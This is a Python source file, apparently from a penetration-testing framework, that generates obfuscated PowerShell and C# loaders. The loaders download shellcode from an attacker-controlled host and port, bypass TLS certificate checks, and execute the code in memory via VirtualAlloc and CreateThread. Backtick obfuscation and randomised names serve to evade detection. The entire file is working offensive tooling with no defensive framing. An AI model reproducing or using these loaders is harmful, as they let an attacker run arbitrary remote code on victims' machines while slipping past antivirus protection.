# -*- coding: utf-8 -*-
import random
import string
import base64
from base64 import b64encode

def randomString():
    return ''.join([random.choice(string.ascii_letters) for n in range(12)])

def checksum8(s):
	return sum([ord(ch) for ch in s]) % 0x100

def genHTTPChecksum():
	chk = string.ascii_letters + string.digits
	for x in range(64):
		uri = "".join(random.sample(chk,3))
		r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for char in r:
			if checksum8(uri + char) == 92:
				return uri + char
                
def generateMPPSLoader(mpProto, mpLhost, mpLport, mpArch, mpSsize):
    if mpArch == "x86":
        mpArch = "ToInt32"
        mpDef = "UInt32"
    elif mpArch == "x64":
        mpArch = "ToInt64"
        mpDef = "UInt64"
    
    if mpProto == "https":
        mpPSSSLChk = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}"
    else:
        mpPSSSLChk = ""

    loaderHost = mpProto+"://"+mpLhost+":"+mpLport+"/"+genHTTPChecksum()
    baseMetPs = '''${0} = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, {8} dwSize, {8} flAllocationType, {8} flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, {8} dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, {8} dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern {8} WaitForSingleObject(IntPtr hHandle, {8} dwMilliseconds);
"@;
{10}
${1} = New-Object "`N`et.`W`ebc`l`i`ent";${1}.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)");${1}.Headers.Add("Accept", "*/*");${1}.Headers.Add("Accept-Language", "en-gb,en;q=0.5");[Byte[]] ${2} = ${1}."D`o`wn`l`oa`d`Data"("{9}");${3} = New-Object byte[] (${2}.Length - {4});[Array]::Copy(${2}, {4}, ${3}, 0, (${2}.Length - {4}));${5} = A`d`d-T`y`p`e -memberDefinition ${0} -Name "Win32" -namespace `W`in`3`2`F`un`ct`i`on`s -passthru;${6}=${5}::VirtualAlloc(0,${3}.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy(${3}, 0, [IntPtr](${6}.{7}()), ${3}.Length);${5}::CreateThread(0,0,${6},0,0,0) | oUT-NuLl;`S`T`A`R`T-`S`l`e`E`p -s `8`6`4`2`0'''

    loaderFinal = baseMetPs.format(randomString(), randomString(), randomString(), randomString(), mpSsize, randomString(), randomString(), mpArch, mpDef, loaderHost, mpPSSSLChk)
    return loaderFinal

def generateMPPSCsharpLoader(mpPsCode):
    mCsharpCode = '''using System;
using System.IO; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text;     
public class {0} {{
    public static void Main() {{
        byte[] {1} = Convert.FromBase64String("{6}");
        string {2} = Encoding.UTF8.GetString({1});
        Runspace {3} = RunspaceFactory.CreateRunspace();
        {3}.Open();
        RunspaceInvoke {4} = new RunspaceInvoke({3});
        Pipeline {5} = {3}.CreatePipeline();
        {5}.Commands.AddScript({2});
        {5}.Invoke();
        {3}.Close();
        return;
    }}
}}'''

    loaderFinal = mCsharpCode.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), b64encode(mpPsCode.encode()))
    return loaderFinal
